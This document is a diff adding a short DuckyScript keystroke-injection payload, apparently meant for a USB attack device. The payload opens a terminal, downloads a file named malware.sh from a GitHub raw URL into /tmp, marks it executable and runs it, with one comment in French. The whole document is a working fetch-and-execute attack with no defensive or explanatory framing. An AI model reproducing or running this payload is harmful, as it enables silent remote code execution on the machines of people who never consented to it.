@@ -1,0 +1,12 @@
+DELAY 2000
+CTRL ALT T
+DELAY 500
+STRING curl -o /tmp/malware.sh https://raw.githubusercontent.com/noahlgrd01/NoahSilentDucky/main/malware.sh
+ENTER
+DELAY 2000
+STRING chmod +x /tmp/malware.sh
+ENTER
+DELAY 500
+REM Exécuter le script
+STRING /tmp/malware.sh
+ENTER 
